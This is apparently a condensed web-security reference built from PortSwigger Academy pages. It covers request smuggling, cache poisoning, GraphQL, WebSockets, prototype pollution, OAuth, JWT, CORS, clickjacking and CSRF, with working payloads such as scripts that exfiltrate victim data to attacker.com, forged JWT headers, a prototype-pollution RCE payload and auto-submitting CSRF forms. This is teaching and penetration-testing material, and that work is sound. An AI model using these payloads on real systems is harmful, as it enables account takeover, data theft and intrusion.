# PortSwigger Academy — Advanced Web Vulnerabilities
> Source: https://portswigger.net/web-security | RAG Knowledge Base | Full detail preserved

---

## HTTP Request Smuggling
**Source:** https://portswigger.net/web-security/request-smuggling

### What It Is
Exploits ambiguity in how front-end and back-end servers parse HTTP/1 request boundaries. Core conflict: `Content-Length` vs `Transfer-Encoding` headers interpreted differently by chained servers. Arises in architectures where load balancers/reverse proxies forward multiple requests over shared back-end connections.

### How to Find It
- Timing-based: craft requests that desynchronize and observe delays
- Differential response: inject payload meant for next request, confirm back-end processes it
- CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding (and vice versa for TE.CL)

### Key Attack Techniques
- **CL.TE:** Send `Content-Length: 13` + chunked body ending in `0\r\n\r\nSMUGGLED` — back-end leaves `SMUGGLED` as start of next request
- **TE.CL:** Send chunked body but short `Content-Length: 3` — front-end processes chunks, back-end truncates, remainder poisons next request
- **TE.TE obfuscation:** Vary Transfer-Encoding header formatting (`Transfer-Encoding : chunked`, tabs, case) to exploit parser differences
- **HTTP/2 downgrade:** H2.CL, H2.TE attacks; CRLF injection via pseudo-headers
- Response queue poisoning, client-side desync (CL.0, H2.0), request tunneling

### Key Payloads/Tools
- Burp Suite (built-in HTTP Request Smuggler extension)
- Ambiguous CL+TE request pairs
- Obfuscated TE header variants:
```
Transfer-Encoding : chunked
Transfer-Encoding: xchunked
Transfer-Encoding
 : chunked
X: X[\n]Transfer-Encoding: chunked
```

### Impact
- Bypass front-end security controls and WAF rules
- Capture other users' requests (credential/cookie theft)
- Exploit reflected XSS, convert on-site redirects to open redirects
- Web cache poisoning/deception, pivot to internal infrastructure
- Severity: often **Critical**

---

## Web Cache Poisoning
**Source:** https://portswigger.net/web-security/web-cache-poisoning

### What It Is
Manipulate web cache to store and serve a malicious response to other users. Two phases: (1) elicit harmful backend response via unkeyed input, (2) ensure it gets cached. Acts as a distribution vector for XSS, JS injection, open redirects, etc.

### How to Find It
- Identify **unkeyed inputs**: headers/parameters ignored by cache but processed by backend
- Manual: inject random values, use Burp Comparer to diff responses with/without input
- Automated: **Param Miner** extension (right-click → "Guess headers") — tests built-in header list, logs to Issues pane

### Key Attack Techniques
- **Cache key exploitation:** Inject via unkeyed headers (e.g., `X-Forwarded-Host`) that backend reflects into response
- **Design flaw abuse:** XSS delivery, unsafe resource imports, cookie handling quirks
- **Implementation flaws:** Unkeyed port/query string, parameter cloaking, normalized cache keys, cache key injection
- **Multi-header chaining:** Stack multiple unkeyed headers to bypass protections
- **DOM-based poisoning:** Serve response exploiting client-side sinks
- **Re-poisoning scripts:** Automate repeated cache poisoning for persistence

### Common Unkeyed Headers to Test
```
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Original-URL: /path
X-Rewrite-URL: /path
X-Forwarded-For: 127.0.0.1
X-Host: evil.com
X-Forwarded-Port: 1337
```

### Key Payloads/Tools
- **Param Miner** (BApp Store) — header enumeration
- **Burp Comparer** — response differential analysis
- Cache busters (unique params) to prevent serving poisoned cache during testing
- Common header: `X-Forwarded-Host: evil.com`

### Impact
- Affects all users visiting poisoned page while cache is active
- Homepage poisoning can hit thousands with zero further interaction
- Persistent: can be scripted to re-poison indefinitely
- Amplified when chained with other vulns

---

## GraphQL API Vulnerabilities
**Source:** https://portswigger.net/web-security/graphql

### What It Is
GraphQL uses a single endpoint for all queries/mutations; misconfigurations expose sensitive data, auth bypass, or DoS. Root causes: disabled introspection bypasses, missing rate limiting, unsanitized arguments, exposed schema fields.

### How to Find It
- Universal probe: `query{__typename}` — returns `{"data":{"__typename":"query"}}` on any GraphQL endpoint
- Common paths: `/graphql`, `/api`, `/api/graphql`, `/graphql/api`, `/graphql/graphql` (also `/v1` variants)
- Try multiple HTTP methods: POST (JSON), GET, POST (x-www-form-urlencoded)
- Introspection: `{"query":"{__schema{queryType{name}}}"}`

### Key Attack Techniques

**Introspection query:**
```json
{"query": "{__schema{types{name,fields{name}}}}"}
```

**Bypass introspection filtering:**
```
Insert space/newline/comma after __schema keyword
Try GET request instead of POST
Try x-www-form-urlencoded Content-Type
```

**IDOR via query arguments:**
```graphql
query {
  user(id: "victim-id") {
    email
    phone
    address
  }
}
```

**Alias-based rate-limit bypass (brute force in single request):**
```graphql
query {
  login1: login(username: "admin", password: "pass1") { token }
  login2: login(username: "admin", password: "pass2") { token }
  login3: login(username: "admin", password: "pass3") { token }
}
```

**GraphQL CSRF:**
- Endpoints accepting GET or `x-www-form-urlencoded` POST with no content-type enforcement allow forged browser requests

**Schema inference via suggestions:**
- Apollo's "Did you mean X?" errors reconstruct schema without introspection

### Key Payloads/Tools
- **Clairvoyance:** Automatically recovers schema from suggestion error responses
- **GraphQL Visualizer:** Converts introspection JSON into visual schema diagram
- Aliased mutation batches for brute-force
- Deeply nested queries for DoS

### Impact
- Private data exposure (emails, user IDs, internal fields)
- Unauthorized data access via IDOR
- Privilege escalation via mutations
- Rate-limit bypass for brute force
- CSRF forcing authenticated mutations
- DoS via resource-exhausting nested queries

---

## WebSockets Security
**Source:** https://portswigger.net/web-security/websockets

### What It Is
Long-lived, bidirectional protocol initiated via HTTP Upgrade handshake. Used for real-time features; all standard HTTP vulnerability classes apply to WebSocket messages and handshakes.

### How to Find It
- Monitor **Burp Proxy → WebSockets history** tab for persistent connections
- Look for HTTP `101 Switching Protocols` upgrade requests
- Examine asynchronous message exchange patterns

### Key Attack Techniques
- **Message manipulation:** Intercept/modify messages via Burp Proxy; replay with Burp Repeater in either direction
- **Handshake exploitation:** Manipulate headers during upgrade (e.g., `X-Forwarded-For` spoofing); exploit flawed session handling or custom headers
- **Cross-Site WebSocket Hijacking (CSWSH):** Establish cross-domain WebSocket connections from attacker site by exploiting CSRF in handshake (no origin validation)
- Inject XSS payloads, SQLi, XXE via message content
- OAST techniques for blind injection

### Key Payloads/Tools
```javascript
// CSWSH PoC
var ws = new WebSocket('wss://target.com/chat');
ws.onmessage = function(event) {
    fetch('https://attacker.com/?d=' + event.data);
};
```

```json
// XSS via message
{"message":"<img src=1 onerror='alert(1)'>"}
```

### Impact
- Unauthorized actions on victim's behalf
- Sensitive data exposure
- XSS via message broadcasting to other connected users
- Database compromise via SQLi
- Session hijacking via CSWSH

---

## Prototype Pollution
**Source:** https://portswigger.net/web-security/prototype-pollution

### What It Is
JavaScript vulnerability: attacker injects arbitrary properties onto global object prototypes (`Object.prototype`). All user-defined objects inherit the polluted properties. Often unexploitable alone — chains with "gadgets" (unsafe property reads) for DOM XSS or server-side RCE.

### How to Find It
- Manual (client-side): examine URL query/fragment strings, trace recursive merge operations, inspect `JSON.parse()` calls on user data, check web message handlers
- Automated: **DOM Invader** (Burp) for client-side source/gadget discovery; **Burp Scanner** for server-side

### Key Attack Techniques

**URL query injection:**
```
?__proto__[property]=value
?__proto__[evilProperty]=evil
```

**URL fragment injection:**
```
#__proto__[property]=value
```

**JSON input:**
```json
{"__proto__": {"evilProperty": "payload"}}
```

**Constructor bypass (bypasses `__proto__` key sanitization):**
```
?constructor[prototype][key]=value
```

**Gadget chaining — DOM XSS:**
```
?__proto__[transport_url]=data:,alert(1);//
?__proto__[transport_url]=//evil.net
```

**Server-side RCE via child_process:**
```json
{"__proto__": {"shell": "node", "argv0": "node", "NODE_OPTIONS": "--require /proc/self/environ"}}
```

### Key Payloads/Tools
- **DOM Invader:** Built-in Burp prototype pollution detector
- Data URL gadget: `?__proto__[transport_url]=data:,alert(1);//`
- External domain: `?__proto__[transport_url]=//evil.net`
- Server-side RCE via `child_process.fork()` / `child_process.execSync()`

### Impact
- Client-side: DOM XSS via polluted properties controlling script sources or event handlers
- Server-side: Remote Code Execution via process spawning
- Scope: all objects inheriting from polluted prototype unless locally overridden

---

## OAuth 2.0 Authentication Vulnerabilities
**Source:** https://portswigger.net/web-security/oauth

### What It Is
Authorization framework for delegated third-party access; widely used for SSO/social login. Three parties: client application, resource owner (user), OAuth service provider. Attack surface: authorization code flow, implicit flow, token handling, redirect URI validation.

### How to Find It
- Identify social/external login buttons
- Proxy traffic; watch for `client_id`, `redirect_uri`, `response_type`, `state` parameters
- Recon endpoints: `/.well-known/oauth-authorization-server`, `/.well-known/openid-configuration`

### Key Attack Techniques

**Implicit flow token theft:**
- Server trusts user-submitted access token without verification — modify user ID parameter to impersonate victim

**Missing `state` parameter (CSRF):**
- Initiate OAuth flow, trick victim's browser into completing it — binds victim's account to attacker's identity

**`redirect_uri` manipulation:**
- Point to attacker-controlled domain to steal authorization codes
- Combine with open redirect chains on whitelisted domains

**Redirect URI bypass tricks:**
```
https://default-host.com&@evil.net#@bar.evil.net/
/oauth/callback/../../evil/path  (directory traversal)
https://victim.com?param=https://evil.com  (duplicate params)
localhost subdomain
response_mode=fragment switching
```

**Token leakage via Referer:**
- HTML `<img src=attacker.net>` in whitelisted domain leaks auth code via Referer header

**Scope upgrade (code flow):**
- Add extra scopes to server-to-server token exchange — server may grant them if not validated

**Scope upgrade (implicit):**
- Steal token from low-privilege app, manually POST to `/userinfo` with elevated `scope`

**Unverified email registration:**
- Register OAuth account with victim's email at provider with no verification — login as victim on relying app

### Key Payloads/Tools
- `state` removal/modification
- `redirect_uri` variations (traversal, encoding, fragments)
- `scope` parameter in exchange requests
- `response_mode=fragment` switching
- HTML injection + image tag Referer leakage
- Server-side parameter pollution (duplicate params)

### Impact
- Complete account takeover on relying applications
- Privilege escalation via scope manipulation
- Persistent access (tokens outlast sessions)
- Widespread risk due to OAuth ubiquity

---

## JWT Attacks
**Source:** https://portswigger.net/web-security/jwt

### What It Is
JWTs are base64url-encoded `header.payload.signature` tokens used for stateless auth/session/access control. All required data is in the token; server trusts claims if signature validates. Vulnerabilities stem from weak secrets, flawed algorithm handling, or header parameter injection.

### How to Find It
- Look for `eyJ...` tokens in Authorization headers, cookies, URL params
- Decode header + payload with jwt.io or Burp JWT Editor
- Test for signature verification gaps, `alg: none` acceptance, weak secrets

### Key Attack Techniques

**`alg: none` attack:**
- Strip signature, set `"alg":"none"` — server skips verification if poorly coded
- Bypass via mixed case (`nOnE`) or encoding tricks
```json
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
```

**Weak secret brute-force:**
```bash
hashcat -a 0 -m 16500 <jwt> jwt-secrets.txt
```

**`jwk` header injection:**
- Embed attacker-generated RSA public key in JWT header — server uses attacker's key to verify

**`jku` header injection:**
- Point to attacker-hosted JWK Set URL — server fetches and trusts attacker's keys
```json
{"alg":"RS256","jku":"https://attacker.com/jwks.json","typ":"JWT"}
```

**`kid` directory traversal:**
- Manipulate `kid` to `/dev/null` or predictable file — empty/known content becomes signing key
```json
{"alg":"HS256","kid":"../../../dev/null","typ":"JWT"}
```

**Algorithm confusion (RS256 → HS256):**
- Server's RSA public key (often obtainable) used as HMAC secret to forge valid tokens

### Key Payloads/Tools
- `hashcat -a 0 -m 16500 <jwt> <wordlist>` — secret brute-force
- **JWT Editor** (Burp BApp) — automates jwk/jku attack generation
- **jwt.io** — manual inspection/manipulation
- Wordlist: https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list

### Impact
- Complete authentication bypass
- Privilege escalation to admin
- Account impersonation of any user
- Full compromise of application security model

---

## CORS Misconfigurations
**Source:** https://portswigger.net/web-security/cors

### What It Is
Browser mechanism that relaxes same-origin policy via HTTP headers. `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials` headers define cross-origin trust. Misconfiguration enables cross-origin reads of sensitive data.

### How to Find It
- Check responses for `Access-Control-Allow-Origin` header
- Test if server reflects arbitrary `Origin` header values back
- Verify `Access-Control-Allow-Credentials: true` with reflected origins (critical combination)
- Test whitelist parsing for regex/suffix match bypass

### Key Attack Techniques

**Arbitrary origin reflection:**
- Server echoes any `Origin` — attacker domain can read credentialed responses

**Whitelist regex bypass:**
- Suffix-match flaw — `hackersnormal-website.com` matches `normal-website.com` regex

**Null origin abuse:**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
  src="data:text/html,<script>
    var req = new XMLHttpRequest();
    req.onload = function() { location='https://attacker.com/?data='+this.responseText; };
    req.open('GET','https://target.com/api/data',true);
    req.withCredentials = true;
    req.send();
  </script>">
</iframe>
```

**XSS + CORS chain:**
- XSS on trusted subdomain used to issue credentialed cross-origin request to main app

**PoC for arbitrary origin reflection:**
```javascript
var req = new XMLHttpRequest();
req.onload = function() {
    location = 'https://attacker.com/log?key=' + this.responseText;
};
req.open('GET', 'https://target.com/accountDetails', true);
req.withCredentials = true;
req.send();
```

### Impact
- Sensitive data exfiltration (API keys, CSRF tokens, session data)
- Account compromise in trusted-origin environments
- Access to internal/intranet resources from external attacker pages

---

## Clickjacking
**Source:** https://portswigger.net/web-security/clickjacking

### What It Is
UI redressing attack: invisible iframe over decoy page tricks user into clicking hidden target site content. Requires user interaction (click); distinct from CSRF. CSS `opacity: 0.00001` + absolute positioning makes target iframe invisible but clickable.

### How to Find It
- Test whether target can be loaded in an iframe (no X-Frame-Options / CSP frame-ancestors)
- Identify actionable elements (buttons, forms) that could be aligned with decoy clicks
- **Burp Clickbandit:** automated PoC overlay generation

### Key Attack Techniques

**Basic overlay:**
```html
<style>
  iframe {
    position: relative;
    width: 700px;
    height: 500px;
    opacity: 0.0001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 300px;
    left: 60px;
    z-index: 1;
  }
</style>
<div>Click me</div>
<iframe src="https://target.com/action"></iframe>
```

**Frame-busting bypass:**
```html
<iframe sandbox="allow-forms allow-scripts" src="https://target.com"></iframe>
```

**Multistep:** Chain multiple iframes/divs for sequential actions (add to cart → checkout)

**DOM XSS chain:** Clickjacking triggers a DOM XSS payload — amplifies impact

### Defenses (to test against)
```
X-Frame-Options: deny / sameorigin
Content-Security-Policy: frame-ancestors 'none'
```

### Impact
- Unauthorized account actions (payments, settings changes, likes/follows)
- Malware distribution via forced downloads
- Carrier for XSS or other chained attacks

---

## Cross-Site Request Forgery (CSRF)
**Source:** https://portswigger.net/web-security/csrf

### What It Is
Forces authenticated users to perform unintended actions by exploiting the browser's automatic cookie inclusion in cross-origin requests. Exploits trust a site has in a user's browser, not trust a browser has in a site.

### Three conditions required
1. Relevant action exists (state change: email/password update, funds transfer, permission change)
2. Session handled solely via cookies (no secondary token/header)
3. All request parameters are attacker-predictable

### Key Attack Techniques

**Hidden auto-submit form:**
```html
<form action="https://target.com/email/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@attacker.com">
  <input type="hidden" name="csrf" value="">
</form>
<script>document.forms[0].submit();</script>
```

**Image-tag GET attack:**
```html
<img src="https://target.com/action?param=evil">
```

**SameSite Lax bypass via GET:** Force state-changing action through GET request if server doesn't enforce POST

**Gadget exploitation:** Leverage on-site open redirect, XSS, or subdomain vulnerability to issue same-site forged request (bypasses `SameSite=Strict`)

**Referer validation bypass:**
```html
<meta name="referrer" content="no-referrer">
```

**Cookie duplication attacks:** Bypasses double-submit cookie pattern if attacker can set cookies

### Key Payloads/Tools
- **Burp CSRF PoC Generator** (right-click request → "Engagement tools → Generate CSRF PoC")
- Auto-submit hidden form HTML
- `<img>` tag for GET-based actions

### SameSite Cookie Attribute
```
SameSite=Strict  — cookie not sent on any cross-site request
SameSite=Lax     — sent on top-level navigation GET only (default in modern browsers)
SameSite=None    — sent on all requests (requires Secure flag)
```

### Impact
- Account takeover (change email → trigger password reset)
- Unauthorized financial transactions
- Privilege escalation if admin is targeted
- Full application compromise for privileged user sessions
